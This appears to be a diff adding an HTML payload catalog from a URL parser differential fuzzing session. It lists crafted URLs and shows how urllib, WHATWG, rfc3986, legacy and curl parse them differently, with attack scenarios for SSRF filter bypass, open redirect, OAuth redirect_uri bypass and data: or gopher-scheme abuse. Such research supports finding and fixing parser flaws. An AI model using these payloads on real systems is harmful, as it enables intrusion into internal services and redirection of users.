+    <div class="payload-title">4.1 Backslash as Scheme vs Path</div>
+    <div class="payload-body">
+      <div class="payload-input">ht\ttp://evil.com/</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Path</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>/</code> (parsed normally)</td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>ht%09tp://evil.com/</code> (entire input = path)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">4.2 Triple-Slash Authority</div>
+    <div class="payload-body">
+      <div class="payload-input">http:///evil.com/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Path</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>/evil.com/path</code> (no host, all path)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>/path</code> (evil.com = host)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">4.3 Semicolon Path Parameter</div>
+    <div class="payload-body">
+      <div class="payload-input">http://good.com/path;key=val?q=1</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Path</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>/path</code> (<code>;</code> truncates)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>/path;key=val</code> (preserved)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        Java/Tomcat path parameter difference. ACL allows <code>/path</code> &rarr; <code>;key=val</code> triggers different behavior.
+      </div>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">4.4 Protocol-Relative URL</div>
+    <div class="payload-body">
+      <div class="payload-input">//evil.com/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Path</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>/path</code> (evil.com = host)</td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>//evil.com/path</code> (entire = path)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">4.5 Backslash Path Normalization</div>
+    <div class="payload-body">
+      <div class="payload-input">\/dfzphiqa.net/fzzxfm.html</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Path</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>\/dfzphiqa.net/fzzxfm.html</code> (entire = path)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>/fzzxfm.html</code> (backslash&rarr;slash, host=dfzphiqa.net)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title" onclick="togglePayload(this)" style="cursor:pointer">
+      <span>&#x2795;</span> More Path Confusion Variants
+    </div>
+    <div class="payload-body" style="display:none">
+      <div class="more-variants">
+<span class="mv-input">http: xmlns="http://www.?\\&lt;b&gt;&lt;i&gt;&lt;/b&gt;&lt;/i&gt;</span>
+<span class="mv-detail">urllib: path='xmlns="http://www.' | WHATWG: path='/ xmlns=...'</span>
+
+<span class="mv-input">httPs:/%p/evil.co'"&gt;&lt;m/pa%00th</span>
+<span class="mv-detail">urllib: path="/%p/evil.co..." | rfc3986: path="/%25p/evil.co..."</span>
+
+<span class="mv-input">//hwwqyl.co.jp/zfmamgo;.js</span>
+<span class="mv-detail">urllib: path="/zfmamgo" | WHATWG: path="/zfmamgo;.js"</span>
+
+<span class="mv-input">http:dict:////goo?key=val;extrad.com%00.evil.com:80//...</span>
+<span class="mv-detail">urllib: path="dict:////goo" | WHATWG: path="////goo"</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ======================= 5. FRAGMENT CONFUSION ======================= -->
+<div id="cat-fragment" class="cat-header" onclick="toggleCat(this)">
+  <span class="cat-icon">#</span>
+  <span class="cat-title">5. Fragment Confusion</span>
+  <span class="badge badge-low">LOW~MED</span>
+  <span class="cat-count" style="background:rgba(139,148,158,0.15);color:var(--muted);border:1px solid rgba(139,148,158,0.3)">36 findings</span>
+  <span class="cat-toggle open">&#9654;</span>
+</div>
+<div class="cat-body" style="max-height:none">
+  <p class="cat-desc">Fragment (<code>#</code>) encoding/boundary interpretation differences.</p>
+
+  <div class="payload-card">
+    <div class="payload-title">5.1 Percent-Encoding Difference</div>
+    <div class="payload-body">
+      <div class="payload-input">http:/#%2f%2fevil.com/go\/.com:080/path&lt;select&gt;&lt;svg&gt;</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Fragment</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>%2f%2fevil.com/go\/.com:080/path&lt;select&gt;&lt;svg&gt;</code></td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>%2f%2fevil.com/go/.com:080/path%3Cselect%3E%3Csvg%3E</code></td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        SPA routing via fragment: encoding difference can route to different pages.
+      </div>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">5.2 NULL Byte + Fragment</div>
+    <div class="payload-body">
+      <div class="payload-input">ht\ttp://##dl.com/%25252f#%41...</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Fragment</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>#dl.com/%25252f#%41...</code> (first <code>#</code> onwards)</td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>%41...</code> (second <code>#</code> onwards)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">5.3 Fragment Boundary Confusion</div>
+    <div class="payload-body">
+      <div class="payload-input">http:?\\evil.com//evil.%00.com\@go?#od.com/pathconstructor.</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Fragment</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>od.com/pathconstructor.</code></td></tr>
+        <tr><td class="parser-name parser-rfc">rfc3986</td><td>Different <code>#</code> recognition point</td></tr>
+      </table>
+    </div>
+  </div>
+</div>
+
+
+<!-- ======================= 6. PORT CONFUSION ======================= -->
+<div id="cat-port" class="cat-header" onclick="toggleCat(this)">
+  <span class="cat-icon">&#x1f50c;</span>
+  <span class="cat-title">6. Port Confusion</span>
+  <span class="badge badge-med">MEDIUM</span>
+  <span class="cat-count" style="background:rgba(88,166,255,0.15);color:var(--accent);border:1px solid rgba(88,166,255,0.3)">34 findings</span>
+  <span class="cat-toggle open">&#9654;</span>
+</div>
+<div class="cat-body" style="max-height:none">
+  <p class="cat-desc">Port parsing/normalization differences.</p>
+
+  <div class="payload-card">
+    <div class="payload-title">6.1 Leading Zero</div>
+    <div class="payload-body">
+      <div class="payload-input">http://good.com:080/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Port</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>080</code> (string as-is)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code></code> (80 = default &rarr; omitted)</td></tr>
+      </table>
+      <div class="payload-input">ftps://0.0.0.0:0000080/..%5c</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Port</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>80</code> (int conversion)</td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>0000080</code> (string preserved)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">6.2 Hex Port</div>
+    <div class="payload-body">
+      <div class="payload-input">http://good.com:0x50/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Port</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>0x50</code> (string)</td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code></code> (hex unrecognized &rarr; default port)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        0x50 = 80. urllib sees "port 0x50" (non-standard), legacy sees "default port 80".
+      </div>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">6.3 Default Port Stripping</div>
+    <div class="payload-body">
+      <div class="payload-input">http://[::1]:80/admin</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Port</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>80</code> (explicit)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code></code> (80 = HTTP default &rarr; removed)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        Port-based ACL: "port 80" vs "no port" may be treated differently.
+      </div>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">6.4 Large/Overflow Port</div>
+    <div class="payload-body">
+      <div class="payload-input">http://good.com:08080/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Port</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>8080</code></td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>08080</code></td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title" onclick="togglePayload(this)" style="cursor:pointer">
+      <span>&#x2795;</span> More Port Variants
+    </div>
+    <div class="payload-body" style="display:none">
+      <div class="more-variants">
+<span class="mv-input">http://good.com:08? key0/@@th# @</span>
+<span class="mv-detail">urllib: port="8" | legacy: port="08"</span>
+
+<span class="mv-input">wss://53.222.24.119.nip.io:0000080/..%2fququ;jsessionid=</span>
+<span class="mv-detail">urllib: port="80" | legacy: port="0000080"</span>
+
+<span class="mv-input">https:oa:80\gp.ozj%e</span>
+<span class="mv-detail">urllib: port="" | WHATWG: port="80"</span>
+
+<span class="mv-input">http://evil.com\@:0000080/path</span>
+<span class="mv-detail">urllib: port="0000080" | WHATWG: port="" (default)</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ======================= 7. AUTHORITY/USERINFO CONFUSION ======================= -->
+<div id="cat-authority" class="cat-header" onclick="toggleCat(this)">
+  <span class="cat-icon">&#x1f464;</span>
+  <span class="cat-title">7. Authority / Userinfo Confusion</span>
+  <span class="badge badge-high">HIGH</span>
+  <span class="cat-count" style="background:rgba(210,153,34,0.15);color:var(--orange);border:1px solid rgba(210,153,34,0.3)">31 findings</span>
+  <span class="cat-toggle open">&#9654;</span>
+</div>
+<div class="cat-body" style="max-height:none">
+  <p class="cat-desc"><code>@</code> symbol interpretation differences confuse userinfo/host boundary.</p>
+
+  <div class="payload-card">
+    <div class="payload-title">7.1 Mailto Userinfo</div>
+    <div class="payload-body">
+      <div class="payload-input">mailto:user@evil.com?subject=test</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Interpretation</th></tr>
+        <tr><td class="parser-name">urllib</td><td>path=<code>user@evil.com</code>, query=<code>subject=test</code></td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td>host=<code>evil.com</code>, userinfo=<code>user</code></td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">7.2 Double @ Authority</div>
+    <div class="payload-body">
+      <div class="payload-input">http://user@evil.com@good.com/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>good.com</code> (last <code>@</code>)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code>evil.com</code> (first <code>@</code>)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">7.3 Encoded @ in Host</div>
+    <div class="payload-body">
+      <div class="payload-input">http://a%40b@127.0.0.1/..;</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>127.0.0.1</code></td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>a</code> (%40 = @, split at different position)</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">7.4 Backslash + @ Combination</div>
+    <div class="payload-body">
+      <div class="payload-input">http://evil.com\@go?key=val;extraod.com/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Userinfo</th><th>Host</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>evil.com\</code></td><td><code>go</code></td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG</td><td><code></code></td><td><code>evil.com</code></td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">7.5 Colon + Backslash in Authority</div>
+    <div class="payload-body">
+      <div class="payload-input">http://:.il.co \@go?#od.com/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Interpretation</th></tr>
+        <tr><td class="parser-name">urllib</td><td>userinfo=<code>:.il.co \</code>, host=<code>go</code></td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td>host=<code>:.il.co</code></td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title" onclick="togglePayload(this)" style="cursor:pointer">
+      <span>&#x2795;</span> More Authority Variants
+    </div>
+    <div class="payload-body" style="display:none">
+      <div class="more-variants">
+<span class="mv-input">HTTP:user:pass@//0x7f000001/%:...</span>
+<span class="mv-detail">urllib: userinfo="" | legacy: userinfo="user:pass"</span>
+
+<span class="mv-input">///zbicwtpih.c@o.k127.0.0.1%23@evil.comr</span>
+<span class="mv-detail">urllib: host="evil.comr" | WHATWG: host="o.k127.0.0.1%23"</span>
+
+<span class="mv-input">http:/evil.com@127.0.0.1evil.com\?\\evi</span>
+<span class="mv-detail">urllib: host="127.0.0.1evil.com" | WHATWG: host="evil.com"</span>
+
+<span class="mv-input">ht\tta://dEi 127.0.0.1:80@evil.com ...</span>
+<span class="mv-detail">urllib: host="evil.com" | legacy: host="dEi"</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ======================= 8. QUERY CONFUSION ======================= -->
+<div id="cat-query" class="cat-header" onclick="toggleCat(this)">
+  <span class="cat-icon">?</span>
+  <span class="cat-title">8. Query Confusion</span>
+  <span class="badge badge-med">MEDIUM</span>
+  <span class="cat-count" style="background:rgba(88,166,255,0.15);color:var(--accent);border:1px solid rgba(88,166,255,0.3)">27 findings</span>
+  <span class="cat-toggle open">&#9654;</span>
+</div>
+<div class="cat-body" style="max-height:none">
+  <p class="cat-desc">Query string encoding/boundary differences.</p>
+
+  <div class="payload-card">
+    <div class="payload-title">8.1 Redirect Parameter</div>
+    <div class="payload-body">
+      <div class="payload-input">http://a?next=http://localhost%40b@127.0.0.1/..;</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Query</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>next=http://localhost%40b@127.0.0.1/..;</code></td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>next=http://localhost%2540b@127.0.0.1/..;</code> (re-encoded)</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        OAuth callback <code>redirect_uri</code> parameter: encoding difference bypasses validation.
+      </div>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">8.2 Special Characters in Query</div>
+    <div class="payload-body">
+      <div class="payload-input">http:?\\evil.com//evil.%00.com\@go?#od.com/path</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Query</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>\\evil.com//evil.%00.com\@go</code></td></tr>
+        <tr><td class="parser-name parser-rfc">rfc3986</td><td><code>%5C%5Cevil.com//evil.%2500.com%5C@go</code></td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">8.3 Null Byte in Query Boundary</div>
+    <div class="payload-body">
+      <div class="payload-input">//hwwqyl.co.?%00jp/zfmamgo;" OR ""="...</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Query</th></tr>
+        <tr><td class="parser-name">urllib</td><td><code>%00jp/zfmamgo;" OR ""="...</code></td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td><code>%2500jp/zfmamgo;...</code> (re-encoded)</td></tr>
+      </table>
+    </div>
+  </div>
+</div>
+
+
+<!-- ======================= 9. SCHEME CONFUSION ======================= -->
+<div id="cat-scheme" class="cat-header" onclick="toggleCat(this)">
+  <span class="cat-icon">&#x1f517;</span>
+  <span class="cat-title">9. Scheme Confusion</span>
+  <span class="badge badge-high">HIGH</span>
+  <span class="cat-count" style="background:rgba(210,153,34,0.15);color:var(--orange);border:1px solid rgba(210,153,34,0.3)">13 findings</span>
+  <span class="cat-toggle open">&#9654;</span>
+</div>
+<div class="cat-body" style="max-height:none">
+
+  <div class="payload-card">
+    <div class="payload-title">9.1 XSS Scheme Bypass</div>
+    <div class="payload-body">
+      <div class="payload-input">data://good.com/text/html,payload</div>
+      <div class="payload-input">data://[v7.jxdmvmdwzbaup]/admin;/../secret/.</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Behavior</th></tr>
+        <tr><td class="parser-name">urllib</td><td>Accept (scheme=<code>data</code>)</td></tr>
+        <tr><td class="parser-name parser-whatwg">WHATWG / curl</td><td>Reject</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        Passing <code>data:</code> URLs through permissive parsers enables XSS payload execution.
+      </div>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">9.2 VBScript Scheme</div>
+    <div class="payload-body">
+      <div class="payload-input">vbscript://::ffff:127.0.0.1/qbywuhtporgjm</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Behavior</th></tr>
+        <tr><td class="parser-name">urllib</td><td>Reject</td></tr>
+        <tr><td class="parser-name parser-legacy">legacy</td><td>Accept</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">9.3 File Scheme (UNC Path)</div>
+    <div class="payload-body">
+      <div class="payload-input">file://evil.com/share/payload</div>
+      <table class="cmp-table">
+        <tr><th>Parser</th><th>Behavior</th></tr>
+        <tr><td class="parser-name">urllib</td><td>Accept</td></tr>
+        <tr><td class="parser-name parser-curl">curl</td><td>Reject</td></tr>
+      </table>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        <code>file://</code> scheme enables local file or UNC path access.
+      </div>
+    </div>
+  </div>
+
+  <div class="payload-card">
+    <div class="payload-title">9.4 Non-Standard Schemes</div>
+    <div class="payload-body">
+      <div class="more-variants">
+<span class="mv-input">ldaps://::ffff:127.0.0.1/.%00.</span>
+<span class="mv-input">dict://[v6.zzzersjikw]/....//%0d%0aHost:%20127.0.0.1</span>
+<span class="mv-input">gopher://[100.209.240.74.dev]:-1/dwabacsc;.js</span>
+      </div>
+      <div class="attack-box">
+        <div class="attack-label">Attack Scenario</div>
+        SSRF filter only checks http/https &rarr; gopher/dict/ldaps reach internal services.
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ======================= 10. SSRF ACCEPT/REJECT ======================= -->
+<div id="cat-accept" class="cat-header" onclick="toggleCat(this)">
+  <span class="cat-icon">&#x26A0;</span>
+  <span class="cat-title">10. SSRF Accept / Reject</span>
+  <span class="badge badge-high">HIGH</span>
+  <span class="cat-count" style="background:rgba(210,153,34,0.15);color:var(--orange);border:1px solid rgba(210,153,34,0.3)">6 findings</span>
+  <span class="cat-toggle open">&#9654;</span>
+</div>
+<div class="cat-body" style="max-height:none">
+  <p class="cat-desc">One parser accepts the URL while the other rejects it &mdash; validation/execution mismatch.</p>
+
+  <div class="payload-card">
+    <div class="payload-body">
+      <table class="cmp-table">
+        <tr><th style="width:50%">Payload</th><th style="width:25%">Accept</th><th style="width:25%">Reject</th></tr>
+        <tr>
+          <td style="font-family:'Cascadia Code','Fira Code',monospace;font-size:0.8rem;color:var(--cyan)">http://127.0.0.1#@evil.com/</td>
+          <td class="parser-name">urllib</td>
+          <td class="parser-name parser-curl">curl</td>
+        </tr>
+        <tr>
+          <td style="font-family:'Cascadia Code','Fira Code',monospace;font-size:0.8rem;color:var(--cyan)">http://[127.0.0.1]/admin</td>
+          <td class="parser-name">urllib</td>
+          <td class="parser-name parser-whatwg">WHATWG</td>
+        </tr>
+        <tr>
+          <td style="font-family:'Cascadia Code','Fira Code',monospace;font-size:0.8rem;color:var(--cyan)">ftps://127.0.0.1:-1/%E0%80%AE</td>
+          <td class="parser-name parser-legacy">legacy</td>
+          <td class="parser-name">urllib</td>
+        </tr>
+        <tr>
+          <td style="font-family:'Cascadia Code','Fira Code',monospace;font-size:0.8rem;color:var(--cyan)">jar://[::1]:+80/..%2fEpv8gOvbCCb</td>
+          <td class="parser-name parser-rfc">rfc3986</td>
+          <td class="parser-name">urllib</td>
+        </tr>
+        <tr>
+          <td style="font-family:'Cascadia Code','Fira Code',monospace;font-size:0.8rem;color:var(--cyan)">httP://user:pass%4`word@127.0.0.1/</td>
+          <td class="parser-name">urllib</td>
+          <td class="parser-name parser-legacy">legacy</td>
+        </tr>
+      </table>
+      <div class="attack-box" style="margin-top:1rem">
+        <div class="attack-label">Attack Scenario</div>
+        The assumption "if Parser A rejects, it's safe" breaks. The execution parser may still accept.
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ======================= SUMMARY TABLE ======================= -->
+<h2 style="font-size:1.4rem;color:var(--accent);margin:3rem 0 1rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border);">Summary</h2>
+
+<div class="card">
+  <table class="summary-table">
+    <tr>
+      <th>Category</th><th>Count</th><th>Severity</th><th>Key Parser Pair</th>
+    </tr>
+    <tr>
+      <td>SSRF Host Confusion</td>
+      <td style="font-weight:700;color:var(--red)">35</td>
+      <td><span class="badge badge-crit">CRITICAL</span></td>
+      <td>urllib&harr;WHATWG, urllib&harr;legacy</td>
+    </tr>
+    <tr>
+      <td>Open Redirect</td>
+      <td style="font-weight:700;color:var(--orange)">74</td>
+      <td><span class="badge badge-high">HIGH</span></td>
+      <td>urllib&harr;WHATWG</td>
+    </tr>
+    <tr>
+      <td>Path Traversal</td>
+      <td style="font-weight:700;color:var(--orange)">65</td>
+      <td><span class="badge badge-high">HIGH</span></td>
+      <td>urllib&harr;WHATWG, urllib&harr;legacy</td>
+    </tr>
+    <tr>
+      <td>Path Confusion</td>
+      <td style="font-weight:700;color:var(--accent)">45</td>
+      <td><span class="badge badge-med">MEDIUM</span></td>
+      <td>urllib&harr;legacy, urllib&harr;WHATWG</td>
+    </tr>
+    <tr>
+      <td>Fragment Confusion</td>
+      <td style="font-weight:700;color:var(--muted)">36</td>
+      <td><span class="badge badge-low">LOW~MED</span></td>
+      <td>urllib&harr;rfc3986</td>
+    </tr>
+    <tr>
+      <td>Port Confusion</td>
+      <td style="font-weight:700;color:var(--accent)">34</td>
+      <td><span class="badge badge-med">MEDIUM</span></td>
+      <td>urllib&harr;WHATWG, urllib&harr;legacy</td>
+    </tr>
+    <tr>
+      <td>Authority Confusion</td>
+      <td style="font-weight:700;color:var(--orange)">31</td>
+      <td><span class="badge badge-high">HIGH</span></td>
+      <td>urllib&harr;legacy</td>
+    </tr>
+    <tr>
+      <td>Query Confusion</td>
+      <td style="font-weight:700;color:var(--accent)">27</td>
+      <td><span class="badge badge-med">MEDIUM</span></td>
+      <td>urllib&harr;rfc3986, urllib&harr;legacy</td>
+    </tr>
+    <tr>
+      <td>Scheme Confusion</td>
+      <td style="font-weight:700;color:var(--orange)">13</td>
+      <td><span class="badge badge-high">HIGH</span></td>
+      <td>urllib&harr;legacy, urllib&harr;curl</td>
+    </tr>
+    <tr>
+      <td>SSRF Accept/Reject</td>
+      <td style="font-weight:700;color:var(--orange)">6</td>
+      <td><span class="badge badge-high">HIGH</span></td>
+      <td>All pairs</td>
+    </tr>
+    <tr>
+      <td><strong>Total (categorized)</strong></td>
+      <td style="font-weight:700;color:var(--cyan)">366</td>
+      <td colspan="2"><span style="color:var(--muted)">+ 187 uncategorized = 553 total</span></td>
+    </tr>
+  </table>
+</div>
+
+
+<div class="footer">
+  URL Parser Differential Fuzzing &mdash; Payload Catalog &bull; Session S57 &bull; Generated 2026-02-23<br>
+  <span style="color:var(--accent)">web-fuzzer</span> &bull; Multi-finding Oracle &bull; 5 parsers &times; 45 seeds &times; 30min
+</div>
+
+<script>
+function toggleCat(header) {
+  const body = header.nextElementSibling;
+  const toggle = header.querySelector('.cat-toggle');
+  if (body.style.maxHeight === '0px' || body.style.maxHeight === '0') {
+    body.style.maxHeight = body.scrollHeight + 'px';
+    setTimeout(() => body.style.maxHeight = 'none', 400);
+    toggle.classList.add('open');
+  } else {
+    body.style.maxHeight = body.scrollHeight + 'px';
+    requestAnimationFrame(() => { body.style.maxHeight = '0px'; });
+    toggle.classList.remove('open');
+  }
+}
+
+function togglePayload(titleEl) {
+  const body = titleEl.nextElementSibling;
+  const icon = titleEl.querySelector('span');
+  if (body.style.display === 'none') {
+    body.style.display = 'block';
+    icon.textContent = '\u2796';
+  } else {
+    body.style.display = 'none';
+    icon.textContent = '\u2795';
+  }
+}
+</script>
+
+</body>
+</html>
